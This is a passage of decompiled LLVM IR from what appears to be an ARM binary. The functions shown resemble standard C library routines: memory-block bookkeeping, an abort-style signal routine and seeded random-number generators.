  br i1 %v2_12b30, label %dec_label_pc_12ba8, label %dec_label_pc_12b38

dec_label_pc_12b38:                               ; preds = %dec_label_pc_12b30
  %v1_12b38 = add i32 %v0_12b44, 12
  %v9_12b3c = icmp eq i32 %v1_12b38, %arg2
  br i1 %v9_12b3c, label %dec_label_pc_12b44, label %dec_label_pc_12ba8

dec_label_pc_12b44:                               ; preds = %dec_label_pc_12b38
  %v1_12b44 = inttoptr i32 %v0_12b44 to i32*
  %v2_12b44 = load i32, i32* %v1_12b44, align 4
  %v1_12b48 = add i32 %v0_12b44, 8
  %v2_12b48 = inttoptr i32 %v1_12b48 to i32*
  %v3_12b48 = load i32, i32* %v2_12b48, align 4
  store i32 %v3_12b48, i32* @r2, align 4
  store i32 %v0_12b4c, i32* @r1, align 4
  %v2_12b50 = add i32 %v2_12b44, %v2_12b28
  store i32 %v2_12b50, i32* %r7.global-to-local, align 4
  %v0_12b54 = call i32 @function_12acc()
  br label %dec_label_pc_12ba8

dec_label_pc_12b5c:                               ; preds = %dec_label_pc_12b28
  %v1_12b5c = add i32 %v0_12b4c, 4
  %v2_12b5c = inttoptr i32 %v1_12b5c to i32*
  %v3_12b5c = load i32, i32* %v2_12b5c, align 4
  store i32 %v3_12b5c, i32* %r5.global-to-local, align 4
  %v2_12b60 = icmp eq i32 %v3_12b5c, 0
  br i1 %v2_12b60, label %dec_label_pc_12b94, label %dec_label_pc_12b68

dec_label_pc_12b68:                               ; preds = %dec_label_pc_12b5c
  %v1_12b68 = inttoptr i32 %v3_12b5c to i32*
  %v2_12b68 = load i32, i32* %v1_12b68, align 4
  store i32 %v2_12b68, i32* @ip, align 4
  %v2_12b6c = sub i32 %v3_12b5c, %v2_12b68
  %v1_12b70 = add i32 %v2_12b6c, 12
  %v9_12b74 = icmp eq i32 %v2_12ae8, %v1_12b70
  br i1 %v9_12b74, label %dec_label_pc_12b7c, label %dec_label_pc_12b94

dec_label_pc_12b7c:                               ; preds = %dec_label_pc_12b68
  store i32 %v0_12b44, i32* @r2, align 4
  store i32 %v3_12b5c, i32* @r1, align 4
  %v2_12b84 = add i32 %v2_12b68, %v2_12b28
  store i32 %v2_12b84, i32* %r7.global-to-local, align 4
  %v0_12b88 = call i32 @function_12acc()
  %v0_12b8c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12b8c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12ba8

dec_label_pc_12b94:                               ; preds = %dec_label_pc_12b68, %dec_label_pc_12b5c
  %v2_12b94 = add i32 %v0_12b4c, %arg3
  store i32 %v2_12b94, i32* %r4.global-to-local, align 4
  store i32 %v3_12b5c, i32* @r3, align 4
  store i32 %v0_12b44, i32* @r2, align 4
  store i32 %v2_12b94, i32* @r1, align 4
  %v0_12ba4 = call i32 @function_12aac()
  br label %dec_label_pc_12ba8

dec_label_pc_12ba8:                               ; preds = %dec_label_pc_12b38, %dec_label_pc_12b30, %dec_label_pc_12b7c, %dec_label_pc_12b44, %dec_label_pc_12b94
  %v0_12ba8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12ba8, i32* %r5.global-to-local, align 4
  %v0_12bac = load i32, i32* %r7.global-to-local, align 4
  %v2_12bac = inttoptr i32 %v0_12ba8 to i32*
  store i32 %v0_12bac, i32* %v2_12bac, align 4
  br label %dec_label_pc_12bcc

dec_label_pc_12b04.dec_label_pc_12bb4.loopexit_crit_edge: ; preds = %dec_label_pc_12afc
  br label %dec_label_pc_12bb4

dec_label_pc_12bb4:                               ; preds = %dec_label_pc_12ae0, %dec_label_pc_12b04.dec_label_pc_12bb4.loopexit_crit_edge, %dec_label_pc_12b14
  %v1_12bb4 = add i32 %v2_12ae8, -12
  store i32 %v1_12bb4, i32* %r5.global-to-local, align 4
  %v3_12bb8 = inttoptr i32 %v1_12bb4 to i32*
  store i32 %arg3, i32* %v3_12bb8, align 4
  %v0_12bbc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12bbc, i32* @r3, align 4
  %v0_12bc0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_12bc0, i32* @r2, align 4
  %v0_12bc4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12bc4, i32* @r1, align 4
  %v0_12bc8 = call i32 @function_12aac()
  br label %dec_label_pc_12bcc

dec_label_pc_12bcc:                               ; preds = %dec_label_pc_12ba8, %dec_label_pc_12bb4
  %v0_12bcc = load i32, i32* %r5.global-to-local, align 4
  %v2_12bd0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12bd0, i32* @r4, align 4
  ret i32 %v0_12bcc

; uselistorder directives
  uselistorder i32 %v3_12b5c, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_12b20, { 1, 0 }
  uselistorder i32 %v3_12b00, { 2, 3, 1, 0 }
  uselistorder i32 %v0_12b4c, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_12b44, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 ()* @function_12aac, { 1, 0 }
  uselistorder i32 ()* @function_12acc, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12bcc, { 1, 0 }
  uselistorder label %dec_label_pc_12bb4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12ba8, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_12af4, { 1, 0 }
}

define i32 @function_12bd4() local_unnamed_addr {
dec_label_pc_12bf0.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_12bd4 = ptrtoint i32* %stack_var_-268 to i32
  %v1_12be4 = call i32 @function_13ab4()
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_12bf0 = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_12bf0

dec_label_pc_12bf0:                               ; preds = %dec_label_pc_12bf0.lr.ph, %dec_label_pc_12bf0
  %v1_12bf4 = phi i32 [ 31, %dec_label_pc_12bf0.lr.ph ], [ %v1_12c00, %dec_label_pc_12bf0 ]
  %v4_12bf4 = mul i32 %v1_12bf4, 4
  %v5_12bf4 = add i32 %v4_12bf4, %v2_12bf0
  %v2_12bfc = add i32 %v5_12bf4, -128
  %v3_12bfc = inttoptr i32 %v2_12bfc to i32*
  store i32 0, i32* %v3_12bfc, align 4
  %v0_12c00 = load i32, i32* %r1.global-to-local, align 4
  %v1_12c00 = add i32 %v0_12c00, -1
  store i32 %v1_12c00, i32* %r1.global-to-local, align 4
  %v6_12c00 = icmp slt i32 %v1_12c00, 0
  br i1 %v6_12c00, label %dec_label_pc_12c08, label %dec_label_pc_12bf0

dec_label_pc_12c08:                               ; preds = %dec_label_pc_12bf0
  %v2_12c08 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_12c08, i32* @r4, align 4
  store i32 %v2_12c08, i32* @r0, align 4
  store i32 6, i32* @r1, align 4
  %v0_12c14 = call i32 @function_1278c()
  %v2_12c18 = icmp eq i32 %v0_12c14, 0
  br i1 %v2_12c18, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_12c08
  store i32 %v2_12c08, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_12c08, %bb
  store i32 76844, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12c18, i32 ptrtoint (i32* @global_var_10918.319 to i32))
  %v2_12c30 = load i32, i32* @global_var_26620.321, align 4
  %v2_12c34 = icmp eq i32 %v2_12c30, 0
  br i1 %v2_12c34, label %dec_label_pc_12c3c, label %dec_label_pc_12c6c

dec_label_pc_12c3c:                               ; preds = %.thread1
  store i32 1, i32* @global_var_26620.321, align 4
  br label %dec_label_pc_12c44

dec_label_pc_12c44:                               ; preds = %dec_label_pc_12cbc, %dec_label_pc_12c3c
  %v1_12c50 = call i32 @function_13ab4()
  %v1_12c58 = call i32 @function_156e0(i32 6)
  store i32 76908, i32* @lr, align 4
  %v1_12c68 = call i32 @function_13ab4()
  %v2_12c70.pre = load i32, i32* @global_var_26620.321, align 4
  br label %dec_label_pc_12c6c

dec_label_pc_12c6c:                               ; preds = %.thread1, %dec_label_pc_12c44
  %v0_12ce0 = phi i32 [ %v2_12c30, %.thread1 ], [ %v2_12c70.pre, %dec_label_pc_12c44 ]
  store i32 ptrtoint (i32* @global_var_26620.321 to i32), i32* %ip.global-to-local, align 4
  %v7_12c74 = icmp eq i32 %v0_12ce0, 1
  br i1 %v7_12c74, label %dec_label_pc_12ca4.lr.ph, label %dec_label_pc_12cd8

dec_label_pc_12ca4.lr.ph:                         ; preds = %dec_label_pc_12c6c
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_26620.321, align 4
  %v2_12c90 = bitcast i32* %stack_var_-268 to i8*
  %v3_12c90 = call i32 @function_11d70(i8* %v2_12c90, i32 0)
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12ca4

dec_label_pc_12ca4:                               ; preds = %dec_label_pc_12ca4.lr.ph, %dec_label_pc_12ca4
  %v1_12ca8 = phi i32 [ 31, %dec_label_pc_12ca4.lr.ph ], [ %v1_12cb4, %dec_label_pc_12ca4 ]
  %v4_12ca8 = mul i32 %v1_12ca8, 4
  %v5_12ca8 = add i32 %v4_12ca8, %v2_12bf0
  %v2_12cb0 = add i32 %v5_12ca8, -264
  %v3_12cb0 = inttoptr i32 %v2_12cb0 to i32*
  store i32 -1, i32* %v3_12cb0, align 4
  %v0_12cb4 = load i32, i32* %r1.global-to-local, align 4
  %v1_12cb4 = add i32 %v0_12cb4, -1
  store i32 %v1_12cb4, i32* %r1.global-to-local, align 4
  %v6_12cb4 = icmp slt i32 %v1_12cb4, 0
  br i1 %v6_12cb4, label %dec_label_pc_12cbc, label %dec_label_pc_12ca4

dec_label_pc_12cbc:                               ; preds = %dec_label_pc_12ca4
  store i32 %v2_12bd4, i32* %r1.global-to-local, align 4
  %v4_12cd0 = call i32 @function_13da0(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_12c44

dec_label_pc_12cd8:                               ; preds = %dec_label_pc_12c6c
  %v7_12cd8 = icmp eq i32 %v0_12ce0, 2
  br i1 %v7_12cd8, label %dec_label_pc_12ce0, label %dec_label_pc_12cec

dec_label_pc_12ce0:                               ; preds = %dec_label_pc_12cd8
  store i32 3, i32* @global_var_26620.321, align 4
  %v0_12ce8 = call i32 @function_12bd4()
  %v2_12cec.pre = load i32, i32* @global_var_26620.321, align 4
  br label %dec_label_pc_12cec

dec_label_pc_12cec:                               ; preds = %dec_label_pc_12cd8, %dec_label_pc_12ce0
  %v1_12cf4 = phi i32 [ %v0_12ce0, %dec_label_pc_12cd8 ], [ %v2_12cec.pre, %dec_label_pc_12ce0 ]
  %v7_12cf0 = icmp eq i32 %v1_12cf4, 3
  br i1 %v7_12cf0, label %bb27, label %.thread3

bb27:                                             ; preds = %dec_label_pc_12cec
  %v2_12cfc = load i32, i32* %ip.global-to-local, align 4
  %v3_12cfc = inttoptr i32 %v2_12cfc to i32*
  store i32 4, i32* %v3_12cfc, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_12cec, %bb27
  call void @__pseudo_cond_branch(i1 %v7_12cf0, i32 ptrtoint (i32* @global_var_10624.323 to i32))
  br label %dec_label_pc_12d04

dec_label_pc_12d04:                               ; preds = %dec_label_pc_12d04, %.thread3
  %v0_12d04 = call i32 @function_12bd4()
  br label %dec_label_pc_12d04

; uselistorder directives
  uselistorder i32 %v1_12cb4, { 2, 1, 0 }
  uselistorder i32 %v1_12c00, { 2, 1, 0 }
  uselistorder i32* %stack_var_-268, { 1, 2, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 8, 3, 0, 1, 4, 5, 7, 6, 2 }
  uselistorder i32* @global_var_26620.321, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_12cec, { 1, 0 }
  uselistorder label %dec_label_pc_12ca4, { 1, 0 }
  uselistorder label %dec_label_pc_12c6c, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_12bf0, { 1, 0 }
}

define i32 @function_12d1c() local_unnamed_addr {
dec_label_pc_12d1c:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_12d20 = load i32, i32* @r4, align 4
  %v6_12d20 = load i32, i32* @r5, align 4
  %v9_12d20 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_204e0.325 to i32), i32* @r4, align 4
  %v2_12d28 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_12d28, i32* @r0, align 4
  %v8_12d40 = call i32 @function_13abc(i32 %v2_12d28, i32 ptrtoint (i32* @global_var_13ab4.226 to i32), i32 ptrtoint (i32* @global_var_204e0.325 to i32), i32 80572, i32 %v3_12d20, i32 %v6_12d20, i32 %v9_12d20)
  %v1_12d50 = call i32 @function_13ab4()
  %v2_12d54 = ptrtoint i32* %stack_var_-16 to i32
  %v3_12d5c = call i32 @function_12ffc(i32* inttoptr (i32 132344 to i32*), i32 %v2_12d54)
  store i32 %v2_12d28, i32* @r0, align 4
  store i32 77172, i32* @lr, align 4
  %v8_12d70 = call i32 @function_13abc(i32 %v2_12d28, i32 1, i32 ptrtoint (i32* @global_var_204e0.325 to i32), i32 80572, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v3_12d74 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_12d20, i32* @r4, align 4
  store i32 %v6_12d20, i32* @r5, align 4
  ret i32 %v3_12d74

; uselistorder directives
  uselistorder i32 %v2_12d28, { 1, 0, 3, 2 }
}

define i32 @function_12ec0(i32 %arg1) local_unnamed_addr {
dec_label_pc_12ec0:
  %stack_var_-32 = alloca i32, align 4
  %v3_12ec0 = load i32, i32* @r4, align 4
  %v6_12ec0 = load i32, i32* @r5, align 4
  %v9_12ec0 = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_204e0.325 to i32), i32* @r4, align 4
  %v2_12ec8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_12ec8, i32* @r0, align 4
  %v8_12ee4 = call i32 @function_13abc(i32 %v2_12ec8, i32 ptrtoint (i32* @global_var_13ab4.226 to i32), i32 ptrtoint (i32* @global_var_204e0.325 to i32), i32 80572, i32 %v3_12ec0, i32 %v6_12ec0, i32 %v9_12ec0)
  store i32 77560, i32* @lr, align 4
  %v1_12ef4 = call i32 @function_13ab4()
  %v0_12ef8 = load i32, i32* @r6, align 4
  store i32 %v0_12ef8, i32* @r0, align 4
  %v2_12f00 = inttoptr i32 %v0_12ef8 to i32*
  %v3_12f00 = call i32 @function_1308c(i32* %v2_12f00, i32 ptrtoint (i32* @global_var_204f8 to i32))
  store i32 %v2_12ec8, i32* @r0, align 4
  store i32 77596, i32* @lr, align 4
  %v8_12f18 = call i32 @function_13abc(i32 %v2_12ec8, i32 1, i32 ptrtoint (i32* @global_var_204e0.325 to i32), i32 80572, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_12ec0, i32* @r4, align 4
  store i32 %v6_12ec0, i32* @r5, align 4
  store i32 %v9_12ec0, i32* @r6, align 4
  ret i32 %v8_12f18

; uselistorder directives
  uselistorder i32 %v2_12ec8, { 0, 1, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_204e0.325 to i32), { 0, 1, 4, 2, 3, 5 }
}

define i32 @function_12ffc(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12ffc:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_12ffc = add i32 %tmp, 12
  %v2_12ffc = inttoptr i32 %v1_12ffc to i32*
  %v3_12ffc = load i32, i32* %v2_12ffc, align 4
  store i32 %v3_12ffc, i32* %r3.global-to-local, align 4
  %v2_13000 = icmp eq i32 %v3_12ffc, 0
  %v3_13004 = load i32, i32* @r4, align 4
  store i32 %v3_13004, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_13010 = add i32 %tmp, 8
  %v2_13010 = inttoptr i32 %v1_13010 to i32*
  %v3_13010 = load i32, i32* %v2_13010, align 4
  store i32 %v3_13010, i32* %lr.global-to-local, align 4
  br i1 %v2_13000, label %dec_label_pc_13018, label %dec_label_pc_1303c

dec_label_pc_13018:                               ; preds = %dec_label_pc_12ffc
  %v1_13018 = inttoptr i32 %v3_13010 to i32*
  %v2_13018 = load i32, i32* %v1_13018, align 4
  store i32 %v2_13018, i32* %r2.global-to-local, align 4
  %v2_13020 = mul i32 %v2_13018, 1103515245
  %v1_13028 = add i32 %v2_13020, 12345
  %tmp10 = bitcast i32 %v1_13028 to float
  %tmp11 = call float @fabsf(float %tmp10)
  %v1_1302c = bitcast float %tmp11 to i32
  store i32 %v1_1302c, i32* %r3.global-to-local, align 4
  store i32 %v1_1302c, i32* %v1_13018, align 4
  %v0_13034 = load i32, i32* %r3.global-to-local, align 4
  %v2_13034 = inttoptr i32 %arg2 to i32*
  store i32 %v0_13034, i32* %v2_13034, align 4
  br label %dec_label_pc_13080

dec_label_pc_1303c:                               ; preds = %dec_label_pc_12ffc
  %v2_1303c = load i32, i32* %arg1, align 4
  store i32 %v2_1303c, i32* %r2.global-to-local, align 4
  %v1_13040 = add i32 %tmp, 4
  %v2_13040 = inttoptr i32 %v1_13040 to i32*
  %v3_13040 = load i32, i32* %v2_13040, align 4
  store i32 %v3_13040, i32* %r0.global-to-local, align 4
  %v1_13044 = inttoptr i32 %v2_1303c to i32*
  %v2_13044 = load i32, i32* %v1_13044, align 4
  store i32 %v2_13044, i32* %r3.global-to-local, align 4
  %v1_13048 = inttoptr i32 %v3_13040 to i32*
  %v2_13048 = load i32, i32* %v1_13048, align 4
  %v4_13048 = add i32 %v3_13040, 4
  store i32 %v4_13048, i32* %r0.global-to-local, align 4
  %v2_1304c = add i32 %v2_13048, %v2_13044
  store i32 %v2_1304c, i32* %r3.global-to-local, align 4
  store i32 %v2_1304c, i32* %v1_13044, align 4
  %v3_13050 = load i32, i32* %r2.global-to-local, align 4
  %v4_13050 = add i32 %v3_13050, 4
  store i32 %v4_13050, i32* %r2.global-to-local, align 4
  %v0_13054 = load i32, i32* %ip.global-to-local, align 4
  %v1_13054 = add i32 %v0_13054, 24
  %v2_13054 = inttoptr i32 %v1_13054 to i32*
  %v3_13054 = load i32, i32* %v2_13054, align 4
  store i32 %v3_13054, i32* %r4.global-to-local, align 4
  %v0_13058 = load i32, i32* %r3.global-to-local, align 4
  %v3_13058 = udiv i32 %v0_13058, 2
  store i32 %v3_13058, i32* %r3.global-to-local, align 4
  %v3_1305c = icmp ult i32 %v4_13050, %v3_13054
  %v1_13060 = load i32, i32* %r5.global-to-local, align 4
  %v2_13060 = inttoptr i32 %v1_13060 to i32*
  store i32 %v3_13058, i32* %v2_13060, align 4
  br i1 %v3_1305c, label %dec_label_pc_13070, label %bb

bb:                                               ; preds = %dec_label_pc_1303c
  %v1_13064 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_13064, i32* %r2.global-to-local, align 4
  %v0_13068 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13068, i32* %r3.global-to-local, align 4
  br label %bb9

dec_label_pc_13070:                               ; preds = %dec_label_pc_1303c
  %v0_130681 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_130681, i32* %r3.global-to-local, align 4
  %v1_13070 = load i32, i32* %r4.global-to-local, align 4
  %v3_13070 = icmp ult i32 %v0_130681, %v1_13070
  br i1 %v3_13070, label %bb8, label %.thread2

bb8:                                              ; preds = %dec_label_pc_13070
  store i32 %v0_130681, i32* %r3.global-to-local, align 4
  br label %bb9

.thread2:                                         ; preds = %dec_label_pc_13070
  %v1_13078 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_13078, i32* %r3.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %bb, %bb8, %.thread2
  %v0_1307c = load i32, i32* %ip.global-to-local, align 4
  %v1_1307c = inttoptr i32 %v0_1307c to i32*
  %v2_1307c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_1307c, i32* %v1_1307c, align 4
  %v3_1307c = add i32 %v0_1307c, 4
  %v4_1307c = inttoptr i32 %v3_1307c to i32*
  %v5_1307c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_1307c, i32* %v4_1307c, align 4
  br label %dec_label_pc_13080

dec_label_pc_13080:                               ; preds = %dec_label_pc_13018, %bb9
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_13084 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13084, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_130681, { 1, 0, 2 }
  uselistorder i32 %v3_13058, { 1, 0 }
  uselistorder i32 %v1_1302c, { 1, 0 }
  uselistorder i32 %tmp, { 3, 1, 0, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 11, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_13080, { 1, 0 }
  uselistorder label %bb9, { 2, 1, 0 }
}

define i32 @function_1308c(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1308c:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1308c = load i32, i32* @r4, align 4
  store i32 %v3_1308c, i32* %stack_var_-32, align 4
  %v6_1308c = load i32, i32* @r5, align 4
  %v1_13090 = add i32 %tmp, 12
  %v2_13090 = inttoptr i32 %v1_13090 to i32*
  %v3_13090 = load i32, i32* %v2_13090, align 4
  %v2_13098 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %tmp22 = icmp ugt i32 %v3_13090, 4
  br i1 %tmp22, label %.dec_label_pc_13144_crit_edge, label %dec_label_pc_130a8

.dec_label_pc_13144_crit_edge:                    ; preds = %dec_label_pc_1308c
  br label %dec_label_pc_13144

dec_label_pc_130a8:                               ; preds = %dec_label_pc_1308c
  %v0_130a8 = load i32, i32* @r0, align 4
  %v2_130a8 = icmp eq i32 %v0_130a8, 0
  %v1_130ac = add i32 %tmp, 8
  %v2_130ac = inttoptr i32 %v1_130ac to i32*
  %v3_130ac = load i32, i32* %v2_130ac, align 4
  store i32 %v3_130ac, i32* %r7.global-to-local, align 4
  br i1 %v2_130a8, label %bb, label %bb19

bb:                                               ; preds = %dec_label_pc_130a8
  store i32 1, i32* @r0, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_130a8, %bb
  %v0_130b8 = phi i32 [ %v0_130a8, %dec_label_pc_130a8 ], [ 1, %bb ]
  %v2_130b4 = icmp eq i32 %v3_13090, 0
  %v2_130b8 = inttoptr i32 %v3_130ac to i32*
  store i32 %v0_130b8, i32* %v2_130b8, align 4
  br i1 %v2_130b4, label %dec_label_pc_13140, label %dec_label_pc_130c0

dec_label_pc_130c0:                               ; preds = %bb19
  %v1_130c0 = add i32 %tmp, 16
  %v2_130c0 = inttoptr i32 %v1_130c0 to i32*
  %v3_130c0 = load i32, i32* %v2_130c0, align 4
  store i32 %v3_130c0, i32* %sb.global-to-local, align 4
  %v0_130c4 = load i32, i32* @r0, align 4
  store i32 %v0_130c4, i32* @r5, align 4
  %v0_130c8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_130c8, i32* %sl.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13100

dec_label_pc_130d4:                               ; preds = %dec_label_pc_13100
  %v2_130d4 = call i32 @function_103f4(i32 %v0_13104, i32 127773)
  store i32 127773, i32* @r1, align 4
  %v2_130e0 = mul i32 %v2_130d4, 16807
  %v0_130e4 = load i32, i32* @r5, align 4
  store i32 %v0_130e4, i32* @r0, align 4
  %v0_130e8 = call i32 @function_15afc()
  %tmp23 = mul i32 %v0_130e8, -2836
  %v2_130f4 = add i32 %v2_130e0, %tmp23
  %v8_130f4 = icmp slt i32 %v2_130f4, 0
  br i1 %v8_130f4, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_130d4
  %v2_130f8 = add i32 %v2_130f4, 2147483647
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_130d4, %bb20
  %storemerge = phi i32 [ %v2_130f8, %bb20 ], [ %v2_130f4, %dec_label_pc_130d4 ]
  %v0_130fc = phi i32 [ %v2_130f8, %bb20 ], [ %v2_130f4, %dec_label_pc_130d4 ]
  store i32 %storemerge, i32* @r5, align 4
  %v1_130fc = load i32, i32* %sl.global-to-local, align 4
  %v2_130fc = add i32 %v1_130fc, 4
  %v3_130fc = inttoptr i32 %v2_130fc to i32*
  store i32 %v0_130fc, i32* %v3_130fc, align 4
  %v4_130fc = load i32, i32* %sl.global-to-local, align 4
  %v5_130fc = add i32 %v4_130fc, 4
  store i32 %v5_130fc, i32* %sl.global-to-local, align 4
  %v0_13100.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_13100.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_13104.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13100

dec_label_pc_13100:                               ; preds = %dec_label_pc_130c0, %bb21
  %v0_13104 = phi i32 [ %v0_130c4, %dec_label_pc_130c0 ], [ %v0_13104.pre, %bb21 ]
  %v0_13118 = phi i32 [ %v3_130c0, %dec_label_pc_130c0 ], [ %v1_13100.pre, %bb21 ]
  %v0_1310c = phi i32 [ 1, %dec_label_pc_130c0 ], [ %v0_13100.pre, %bb21 ]
  %v1_1310c = add i32 %v0_1310c, 1
  store i32 %v1_1310c, i32* %r8.global-to-local, align 4
  %v5_13110 = icmp slt i32 %v0_1310c, %v0_13118
  br i1 %v5_13110, label %dec_label_pc_130d4, label %dec_label_pc_13114

dec_label_pc_13114:                               ; preds = %dec_label_pc_13100
  %v2_13118 = mul i32 %v0_13118, 10
  store i32 %v2_13118, i32* @r4, align 4
  %v0_1311c = load i32, i32* %r6.global-to-local, align 4
  %v1_1311c = add i32 %v0_1311c, 20
  %v2_1311c = inttoptr i32 %v1_1311c to i32*
  %v3_1311c = load i32, i32* %v2_1311c, align 4
  %v0_13120 = load i32, i32* %r7.global-to-local, align 4
  %v4_13120 = mul i32 %v3_1311c, 4
  %v5_13120 = add i32 %v0_13120, %v4_13120
  %v1_13124 = inttoptr i32 %v0_1311c to i32*
  store i32 %v5_13120, i32* %v1_13124, align 4
  %v3_13124 = add i32 %v0_1311c, 4
  %v4_13124 = inttoptr i32 %v3_13124 to i32*
  %v5_13124 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_13124, i32* %v4_13124, align 4
  br label %dec_label_pc_13130

dec_label_pc_1312c:                               ; preds = %dec_label_pc_13130
  %v0_13134 = load i32, i32* %r6.global-to-local, align 4
  %v2_1312c = inttoptr i32 %v0_13134 to i32*
  %v3_1312c = call i32 @function_12ffc(i32* %v2_1312c, i32 %v2_13098)
  br label %dec_label_pc_13130

dec_label_pc_13130:                               ; preds = %dec_label_pc_13114, %dec_label_pc_1312c
  %v0_13130 = load i32, i32* @r4, align 4
  %v1_13130 = add i32 %v0_13130, -1
  store i32 %v1_13130, i32* @r4, align 4
  %v6_13130 = icmp slt i32 %v1_13130, 0
  br i1 %v6_13130, label %dec_label_pc_13140, label %dec_label_pc_1312c

dec_label_pc_13140:                               ; preds = %dec_label_pc_13130, %bb19
  %v2_13148.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_13144

dec_label_pc_13144:                               ; preds = %.dec_label_pc_13144_crit_edge, %dec_label_pc_13140
  %v2_13148 = phi i32 [ %v3_1308c, %.dec_label_pc_13144_crit_edge ], [ %v2_13148.pre, %dec_label_pc_13140 ]
  %v26_13148 = phi i32 [ -1, %.dec_label_pc_13144_crit_edge ], [ 0, %dec_label_pc_13140 ]
  store i32 %v2_13148, i32* @r4, align 4
  store i32 %v6_1308c, i32* @r5, align 4
  ret i32 %v26_13148

; uselistorder directives
  uselistorder i32 %v1_13130, { 1, 0 }
  uselistorder i32 %v0_1311c, { 1, 0, 2 }
